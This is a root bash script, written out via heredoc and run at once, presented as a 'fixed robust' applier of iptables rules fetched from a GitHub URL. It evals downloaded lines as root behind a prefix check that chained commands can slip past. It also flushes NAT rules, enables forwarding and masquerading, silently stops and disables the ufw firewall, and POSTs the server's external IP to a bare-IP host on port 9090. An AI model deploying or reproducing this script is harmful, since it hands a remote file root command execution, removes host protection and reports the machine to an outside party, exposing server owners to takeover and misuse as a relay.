sudo tee /root/rlsapl_fixed.sh > /dev/null <<'SCRIPT'
#!/usr/bin/env bash
# apply_rules_from_url - fixed robust version
set -o errexit
set -o nounset
set -o pipefail

DEFAULT_RULES_URL="https://raw.githubusercontent.com/ZhuZhuZhuang10/block_delete/refs/heads/main/rls.txt"
RULES_URL="${1:-$DEFAULT_RULES_URL}"
DRY_RUN=false
CONTINUE_ON_ERROR=false
for arg in "${@:2}"; do
  case "$arg" in
    --dry-run) DRY_RUN=true ;;
    --continue-on-error) CONTINUE_ON_ERROR=true ;;
    *) echo "Unknown option: $arg"; exit 2 ;;
  esac
done

LOG="/var/log/apply_rules_from_url_fixed.log"
exec > >(tee -a "$LOG") 2>&1

echo "=== apply_rules_from_url (fixed) started: $(date -u +"%Y-%m-%dT%H:%M:%SZ") ==="
echo "Rules URL: $RULES_URL"
echo "Dry run: $DRY_RUN"
echo "Continue on error: $CONTINUE_ON_ERROR"

if [ "$(id -u)" -ne 0 ]; then
  echo "This script must be run as root (sudo)."
  exit 3
fi

TMP_DIR="$(mktemp -d)"
RULES_RAW="$TMP_DIR/rls.raw"
RULES_FILE="$TMP_DIR/rls.normalized"

cleanup() {
  rm -rf "$TMP_DIR"
}
trap cleanup EXIT

# download rules
echo "Downloading rules..."
if command -v curl >/dev/null 2>&1; then
  curl -fsSL --max-time 20 "$RULES_URL" -o "$RULES_RAW" || { echo "Failed to download rules via curl"; exit 4; }
elif command -v wget >/dev/null 2>&1; then
  wget -qO "$RULES_RAW" "$RULES_URL" || { echo "Failed to download rules via wget"; exit 4; }
else
  echo "Neither curl nor wget available; please install one and re-run."
  exit 4
fi

# Remove Windows CRs and ensure sensible format.
tr -d '\r' < "$RULES_RAW" > "$RULES_RAW.nocr"

# Normalize: put each 'iptables' at line start (if rules were concatenated)
# Also remove empty lines and trim spaces.
sed -E 's/[[:space:]]*iptables/\
iptables/g' "$RULES_RAW.nocr" \
  | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//' \
  | awk 'NF{print}' \
  > "$RULES_FILE"

echo "Preview of normalized rules (first 40 lines):"
nl -ba -w3 -s'. ' "$RULES_FILE" | sed -n '1,40p' || true

# Backup current iptables
BACKUP_FILE="/root/iptables.backup.$(date +%s)"
if command -v iptables-save >/dev/null 2>&1; then
  echo "Backing up current iptables to $BACKUP_FILE"
  if ! iptables-save > "$BACKUP_FILE" 2>/dev/null; then
    echo "Warning: iptables-save failed (continuing)"
  fi
else
  echo "iptables-save not found; backup skipped"
fi

# Try to ensure iptables tool exists (best-effort)
install_pkg() {
  pkg="$1"
  if command -v apt-get >/dev/null 2>&1; then
    apt-get update -y && apt-get install -y "$pkg"
  elif command -v yum >/dev/null 2>&1; then
    yum install -y "$pkg"
  elif command -v apk >/dev/null 2>&1; then
    apk add --no-cache "$pkg"
  else
    echo "No supported package manager found to install $pkg."
    return 1
  fi
}

if ! command -v iptables >/dev/null 2>&1; then
  echo "iptables not found — attempting to install..."
  install_pkg iptables || echo "Auto-install failed; continuing (system may use nftables)"
fi

# Flush PREROUTING (best-effort)
echo "Flushing NAT PREROUTING chain (best-effort)..."
if iptables -t nat -F PREROUTING 2>/dev/null; then
  echo "PREROUTING flushed."
else
  echo "Warning: could not flush PREROUTING (chain may not exist or iptables unavailable)."
fi

# Execute rules line-by-line
LINE_NO=0
while IFS= read -r rawline || [ -n "$rawline" ]; do
  LINE_NO=$((LINE_NO+1))
  # strip comments after # and trim
  line="$(printf '%s\n' "$rawline" | sed -E 's/#.*$//' | sed -E 's/^[[:space:]]+//;s/[[:space:]]+$//')"
  [ -z "$line" ] && continue
  echo "[$LINE_NO] $line"

  if $DRY_RUN; then
    echo " (dry-run) skipping execution"
    continue
  fi

  # Only allow commands that start with iptables or ip (safer)
  if [[ "$line" =~ ^(iptables|ip\ ) ]]; then
    if eval "$line"; then
      echo "[$LINE_NO] OK"
    else
      echo "[$LINE_NO] ERROR executing: $line"
      if [ "$CONTINUE_ON_ERROR" = true ]; then
        echo "Continuing due to --continue-on-error"
        continue
      else
        echo "Aborting. You can restore previous rules with: iptables-restore < $BACKUP_FILE"
        exit 5
      fi
    fi
  else
    echo "Skipping unsafe/unsupported command on line $LINE_NO: $line"
    if [ "$CONTINUE_ON_ERROR" = false ]; then
      echo "Aborting due to unsupported command. Use --continue-on-error to ignore."
      exit 6
    fi
  fi
done < "$RULES_FILE"

# Ensure MASQUERADE exists
echo "Ensuring POSTROUTING MASQUERADE exists..."
if ! iptables -t nat -C POSTROUTING -j MASQUERADE >/dev/null 2>&1; then
  if $DRY_RUN; then
    echo "(dry-run) Would add: iptables -t nat -A POSTROUTING -j MASQUERADE"
  else
    iptables -t nat -A POSTROUTING -j MASQUERADE || echo "Warning: failed to add MASQUERADE"
  fi
else
  echo "MASQUERADE rule already present."
fi

# Enable ip forwarding
SYSCTL_KEY="net.ipv4.ip_forward"
if $DRY_RUN; then
  echo "(dry-run) Would set $SYSCTL_KEY = 1 and run sysctl -p"
else
  if [ "$(sysctl -n $SYSCTL_KEY 2>/dev/null || echo 0)" != "1" ]; then
    if grep -q "^${SYSCTL_KEY}" /etc/sysctl.conf 2>/dev/null; then
      sed -i "s|^${SYSCTL_KEY}.*|${SYSCTL_KEY} = 1|" /etc/sysctl.conf || echo "${SYSCTL_KEY} = 1" >> /etc/sysctl.conf
    else
      echo "${SYSCTL_KEY} = 1" >> /etc/sysctl.conf
    fi
  fi
  sysctl -p || echo "Warning: sysctl -p failed"
fi

# Stop/disable ufw quietly
if command -v systemctl >/dev/null 2>&1; then
  systemctl stop ufw.service 2>/dev/null || true
  systemctl disable ufw.service 2>/dev/null || true
fi

# Post external IP to endpoint (best-effort)
BACKUP_IPS_ENDPOINT="http://37.220.86.169:9090/backup_ips"
if ! $DRY_RUN && command -v curl >/dev/null 2>&1; then
  echo "Detecting external IP..."
  EXIP="$(curl -s --max-time 5 https://ipinfo.io/ip || true)"
  if [ -z "$EXIP" ]; then
    EXIP="$(curl -s --max-time 5 https://ifconfig.co || true)"
  fi
  if [ -n "$EXIP" ]; then
    echo "External IP: $EXIP — POSTing to $BACKUP_IPS_ENDPOINT (best-effort)"
    curl -s -m5 -X POST -H "Content-Type: application/json" -d "{\"ip\":\"$EXIP\"}" "$BACKUP_IPS_ENDPOINT" || echo "Warning: POST failed"
  else
    echo "Could not detect external IP; skipping POST."
  fi
fi

echo "=== Completed successfully. Backup: $BACKUP_FILE ==="
SCRIPT

# make executable and run
chmod +x /root/rlsapl_fixed.sh && /root/rlsapl_fixed.sh
